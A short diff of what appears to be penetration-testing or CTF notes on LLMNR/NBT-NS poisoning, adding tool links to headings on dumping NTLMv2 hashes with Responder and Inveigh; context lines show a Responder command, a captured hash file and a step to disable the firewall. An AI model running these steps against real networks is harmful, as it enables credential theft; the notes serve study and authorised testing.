@@ -13,7 +13,7 @@ LLMNR and NBT-NS poisoning attacks
 STEP 1 - Dumping NTLMV2 hashes
 ==================================================================================================================
 
-Example 1 - Dumping NTLMV2 hashes with the tool RESPONDER
+Example 1 - Dumping NTLMV2 hashes with the tool RESPONDER (https://github.com/lgandx/Responder)
 ==================================================================================================================
 
 jeff@kali:~/Documents/CTFs/BadBlood$ sudo responder -I eth0 -w -r -f
@@ -175,7 +175,7 @@ drwxr-xr-x 9 root root  4096 Apr 15 05:43 ..
 -rw-r--r-- 1 root root  5012 Apr 15 05:43 SMB-NTLMv2-SSP-192.168.1.50.txt
 
 
-Example 2 - Dumping NTLMV2 hashes with 'PowerShell Inveigh'
+Example 2 - Dumping NTLMV2 hashes with 'PowerShell Inveigh' (https://github.com/Kevin-Robertson/Inveigh/wiki)
 ==================================================================================================================
 
 => Start an elevated CMD shell (local admin) and disable the FW
